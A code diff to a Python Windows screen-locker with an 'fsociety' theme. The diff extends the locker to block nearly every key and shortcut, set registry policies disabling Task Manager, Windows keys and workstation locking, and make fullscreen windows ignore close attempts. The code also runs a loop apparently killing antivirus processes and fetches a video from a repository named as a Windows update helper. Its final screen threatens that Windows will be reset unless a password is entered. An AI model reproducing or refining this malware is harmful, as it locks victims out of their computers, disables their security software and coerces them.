@@ -24,9 +24,9 @@ import cv2, pygame, keyboard, numpy as np, socket, re, winsound
 PASS = "1601"
 TRIES = 5
 HOURS = 1
-DELAY_MINUTES = 15  # Для боевого режима
-TEST_DELAY = 15  # Для теста (секунд)
-TEST_MODE = True  # True = тест (15 сек), False = боевой (15 мин)
+DELAY_MINUTES = 15
+TEST_DELAY = 15
+TEST_MODE = True
 TIMER = os.path.join(tempfile.gettempdir(), "timer.dat")
 ATTEMPTS_FILE = os.path.join(tempfile.gettempdir(), "attempts.dat")
 VIDEO_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/fuxEcorp.mp4.mp4"
@@ -35,7 +35,6 @@ T = tempfile.gettempdir()
 V = os.path.join(T, "v.mp4")
 M = os.path.join(T, "m.mp3")
 
-# Загружаем сохранённые попытки
 if os.path.exists(ATTEMPTS_FILE):
     try:
         with open(ATTEMPTS_FILE) as f: tries = int(f.read())
@@ -79,15 +78,59 @@ def kill_av():
             except: pass
         time.sleep(0.1)
 
-def lock_keys():
+# ============================================================
+# ПОЛНАЯ БЛОКИРОВКА КЛАВИАТУРЫ (ВООБЩЕ ВСЕ КЛАВИШИ)
+# ============================================================
+def block_all_keys():
+    """Блокирует ВООБЩЕ ВСЕ клавиши — только Enter и Backspace работают в поле пароля"""
+    # Реестр
     for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
-        for k,n in [(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr")]:
+        for k,n in [
+            (r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),
+            (r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr"),
+            (r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableLockWorkstation"),
+        ]:
             try: r=winreg.OpenKey(h,k,0,winreg.KEY_SET_VALUE); winreg.SetValueEx(r,n,0,winreg.REG_DWORD,1); winreg.CloseKey(r)
             except: pass
-    for k in ['alt','ctrl','shift','tab','caps lock','esc','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','delete','windows','left windows','right windows']:
+    
+    # Блокируем все возможные клавиши
+    all_keys = [
+        'alt','left alt','right alt',
+        'ctrl','left ctrl','right ctrl',
+        'shift','left shift','right shift',
+        'tab','caps lock','esc',
+        'f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12',
+        'print screen','scroll lock','pause',
+        'insert','home','end','page up','page down',
+        'delete',
+        'up','down','left','right',
+        'windows','left windows','right windows',
+        'apps','menu',
+        'num lock','num pad 0','num pad 1','num pad 2','num pad 3','num pad 4',
+        'num pad 5','num pad 6','num pad 7','num pad 8','num pad 9',
+        'num pad *','num pad +','num pad -','num pad /','num pad .',
+        'volume up','volume down','volume mute',
+        'media next','media previous','media stop','media play/pause',
+    ]
+    for k in all_keys:
         try: keyboard.block_key(k)
         except: pass
-    for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v','win+d','win+r','win+e','win+l','win+m','win+x','win+tab']:
+    
+    # Блокируем все комбинации
+    combos = [
+        'alt+f4','alt+tab','alt+esc','alt+space',
+        'ctrl+shift+esc','ctrl+alt+del','ctrl+esc',
+        'ctrl+w','ctrl+f4','ctrl+tab',
+        'ctrl+c','ctrl+v','ctrl+x','ctrl+z','ctrl+a','ctrl+p','ctrl+s','ctrl+o','ctrl+n','ctrl+t',
+        'win+d','win+r','win+e','win+l','win+m','win+x','win+tab',
+        'win+ctrl+d','win+ctrl+f4',
+        'win+1','win+2','win+3','win+4','win+5','win+6','win+7','win+8','win+9','win+0',
+        'win+b','win+i','win+k','win+p','win+q','win+t','win+u','win+w',
+        'win+shift+s','win+shift+m',
+        'win+left','win+right','win+up','win+down',
+        'win+home','win+space','win+enter',
+    ]
+    for c in combos:
         try: keyboard.add_hotkey(c, lambda:0, suppress=True)
         except: pass
 
@@ -95,7 +138,11 @@ def unlock_keys():
     try: keyboard.unhook_all()
     except: pass
     for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
-        for k,n in [(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr")]:
+        for k,n in [
+            (r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),
+            (r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr"),
+            (r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableLockWorkstation"),
+        ]:
             try: r=winreg.OpenKey(h,k,0,winreg.KEY_SET_VALUE); winreg.SetValueEx(r,n,0,winreg.REG_DWORD,0); winreg.CloseKey(r)
             except: pass
 
@@ -124,6 +171,8 @@ def show_final_screen(msg):
         f = tk.Tk()
         f.attributes('-fullscreen', True); f.attributes('-topmost', True)
         f.configure(bg='black'); f.overrideredirect(True)
+        f.protocol("WM_DELETE_WINDOW",lambda:None)
+        f.bind("<Alt-F4>",lambda e:None); f.bind("<Escape>",lambda e:None)
         tk.Label(f, text=msg, bg='black', fg='#ff0000', font=('Courier', 40, 'bold')).pack(expand=True)
         tk.Label(f, text="Windows будет сброшена...", bg='black', fg='white', font=('Courier', 20)).pack()
         f.update(); time.sleep(3); f.destroy()
@@ -148,12 +197,14 @@ def startup():
     except: pass
 
 def anim():
-    a=tk.Tk(); a.attributes('-fullscreen',True); a.attributes('-topmost',True)
+    a=tk.Tk()
+    a.attributes('-fullscreen',True); a.attributes('-topmost',True)
     a.configure(bg='black'); a.overrideredirect(True)
     a.protocol("WM_DELETE_WINDOW",lambda:None)
-    a.bind("<Alt-F4>",lambda e:None); a.bind("<Escape>",lambda e:None)
-    # Блокируем Win
-    a.bind("<Win_L>",lambda e:None); a.bind("<Win_R>",lambda e:None)
+    # Блокируем ВСЕ возможные события закрытия
+    for key in ["<Alt-F4>","<Escape>","<Win_L>","<Win_R>","<Control-Alt-Delete>","<Alt-Tab>"]:
+        a.bind(key, lambda e: None)
+    a.focus_force()
     l=tk.Label(a,text="",bg='black',fg='white',font=('Courier',55,'bold')); l.pack(expand=True)
     for t in ["f","f s","f s o","f s o c","f s o c i","f s o c i e","f s o c i e t","f s o c i e t y"]:
         l.config(text=t); a.update(); time.sleep(0.3)
@@ -174,9 +225,12 @@ def video():
         while cap.isOpened():
             ret,frame=cap.read()
             if not ret: break
-            cv2.imshow("FSOCIETY",frame); cv2.waitKey(int(1000/fps))
+            cv2.imshow("FSOCIETY",frame)
+            k = cv2.waitKey(int(1000/fps)) & 0xFF
+            if k == 27 or k == ord('q') or k == ord('x'):
+                pass  # Игнорируем Esc, Q, X
         cap.release(); cv2.destroyAllWindows()
-        for _ in range(5): cv2.waitKey(1)
+        for _ in range(10): cv2.waitKey(1)
     except: pass
 
 class Locker:
@@ -187,8 +241,10 @@ class Locker:
         self.w.attributes('-fullscreen',True); self.w.attributes('-topmost',True)
         self.w.configure(bg='black'); self.w.overrideredirect(True)
         self.w.protocol("WM_DELETE_WINDOW",lambda:None)
-        self.w.bind("<Alt-F4>",lambda e:None); self.w.bind("<Escape>",lambda e:None)
-        self.w.bind("<Win_L>",lambda e:None); self.w.bind("<Win_R>",lambda e:None)
+        # Блокируем ВСЕ события закрытия
+        for key in ["<Alt-F4>","<Escape>","<Win_L>","<Win_R>","<Control-Alt-Delete>","<Alt-Tab>",
+                     "<Control-Shift-Escape>","<Control-Escape>"]:
+            self.w.bind(key, lambda e: None)
         self.w.focus_force()
         self.end=timer_get()
         self.tl=tk.Label(self.w,text="",bg='black',fg='#ff4444',font=('Courier',30,'bold'))
@@ -268,15 +324,16 @@ if __name__=="__main__":
     threading.Thread(target=kill_av, daemon=True).start()
     threading.Thread(target=timer_check, daemon=True).start()
     
+    # БЛОКИРУЕМ ВСЕ КЛАВИШИ СРАЗУ (до анимации)
+    block_all_keys()
+    
     if is_first_run():
-        # Тест или боевой режим
         if TEST_MODE:
-            time.sleep(TEST_DELAY)  # 15 секунд для теста
+            time.sleep(TEST_DELAY)
         else:
-            time.sleep(DELAY_MINUTES * 60)  # 15 минут боевой
+            time.sleep(DELAY_MINUTES * 60)
         anim()
         video()
     
-    lock_keys()
     Locker()
     tk.mainloop()
